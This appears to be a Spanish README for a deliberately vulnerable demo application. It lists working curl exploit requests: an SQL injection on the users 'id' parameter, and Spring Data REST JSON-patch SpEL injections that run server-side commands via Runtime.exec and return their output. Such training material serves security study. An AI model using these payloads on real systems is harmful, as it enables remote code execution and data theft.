# AppVulnerable

## Pasos previos

Se debe tener corriendo una base de datos mysql y ejecutar los scripts que estan dentro de la carpeta script para crear la tabla y el usuario que la app usa

## Requests que explotan vulnerabilidades

- curl -X GET localhost:8080/users?id=6%20OR%201=1
	- id es un campo vulnerable a sql injection

- curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"[comando]\").x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
	- Ejecuta comandos del lado del servidor
	- Pervio a esto se debe crear la /entity/1/ con -> curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://hostname:port/entity

- curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
	- Permite ver el output de la ejecucion del comando
